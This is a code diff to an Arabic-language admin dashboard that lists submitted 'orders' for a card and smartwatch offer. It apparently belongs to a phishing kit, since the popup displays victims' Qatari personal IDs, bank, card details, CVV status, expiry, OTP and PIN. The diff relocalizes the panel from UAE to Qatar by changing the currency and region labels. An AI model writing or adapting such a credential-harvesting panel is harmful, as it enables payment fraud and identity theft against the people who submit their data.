@@ -420,11 +420,11 @@ body.pop-open{overflow:hidden}
           <thead>
             <tr>
               <th>نوع البطاقة</th>
-              <th>الساعة</th>
+              <th>الساعة الذكية</th>
               <th>الاسم</th>
               <th>رقم الجوال</th>
               <th>الحالة</th>
-              <th>المنطقة</th>
+              <th>الإمارة / المنطقة</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
@@ -562,7 +562,7 @@ function openPop(ref){
   $("popBody").innerHTML = `
     <div class="dgrid">
       <div class="drow"><span class="k">نوع البطاقة</span><span class="v">${card ? card.ar : (o.cardName || o.card)}</span></div>
-      <div class="drow"><span class="k">الساعة</span><span class="v">${watch ? watch.ar : (o.watchName || "—")}</span></div>
+      <div class="drow"><span class="k">الساعة الذكية</span><span class="v">${watch ? watch.ar : (o.watchName || "—")}</span></div>
       <div class="drow"><span class="k">الحالة</span><span class="v">${statusText(o.status)}</span></div>
       <div class="drow"><span class="k">التاريخ</span><span class="v">${fmtDate(o.ts)}</span></div>
       <div class="drow"><span class="k">الصفة</span><span class="v">${o.st === "resident" ? "مقيم" : "مواطن"}</span></div>
@@ -572,13 +572,13 @@ function openPop(ref){
       <div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e)}</span></div>
       <div class="drow"><span class="k">الرقم الشخصي القطري</span><span class="v" style="direction:ltr">${fmtQid(o.id)}</span></div>
       <div class="drow"><span class="k">الإمارة</span><span class="v">${emName(o.em)}</span></div>
-      <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
+      <div class="drow"><span class="k">الإمارة / المنطقة</span><span class="v">${esc(`${emName(o.em) || "—"} / ${areaName(o.em,o.a) || "—"}`)}</span></div>
       <div class="drow"><span class="k">البنك</span><span class="v">${esc(bankName || "-")}</span></div>
       <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
     </div>
  ${(o.pay || cardName || cardNumber || o.cvv || o.expiry || o.otp || o.pin) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
 <div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(cardName || '-')}</span></div>
-<div class="drow"><span class="k">نوع البطاقة</span><span class="v" style="direction:ltr">${esc(cardBrand || '-')}</span></div>
+<div class="drow"><span class="k">نوع البطاقة البنكية</span><span class="v" style="direction:ltr">${esc(cardBrand || '-')}</span></div>
 <div class="drow"><span class="k">آخر 4 أرقام</span><span class="v" style="direction:ltr">${esc(last4 || '-')}</span></div>
 <div class="drow"><span class="k">CVV</span><span class="v">${hasCvv ? 'تم الإدخال' : '-'}</span></div>
 <div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(cardExp || '-')}</span></div>
@@ -635,13 +635,13 @@ function render(){
   const today = all.filter(o => new Date(o.ts).toDateString() === new Date().toDateString()).length;
   $("stTotal").textContent = all.length;
   $("stToday").textContent = today;
-  $("stFees").textContent = (all.filter(o => o.status === "confirmed").length * 5) + " AED";
+  $("stFees").textContent = (all.filter(o => o.status === "confirmed").length * 5) + " ر.ق";
 
   if (q) orders = orders.filter(o => (o.n||"").toLowerCase().includes(q) || (o.p||"").includes(q.replace(/\D/g,"")));
 
   const rows = $("rows");
   if (!orders.length){
-    rows.innerHTML = `<tr class="empty-row"><td colspan="5">${q ? "لا توجد نتائج مطابقة للبحث." : "لا توجد طلبات بعد. سيظهر الطلب هنا فور ضغط العميل على تأكيد ومتابعة."}</td></tr>`;
+    rows.innerHTML = `<tr class="empty-row"><td colspan="7">${q ? "لا توجد نتائج مطابقة للبحث." : "لا توجد طلبات بعد. سيظهر الطلب هنا فور ضغط العميل على تأكيد ومتابعة."}</td></tr>`;
     return;
   }
   rows.innerHTML = orders.map(o => {
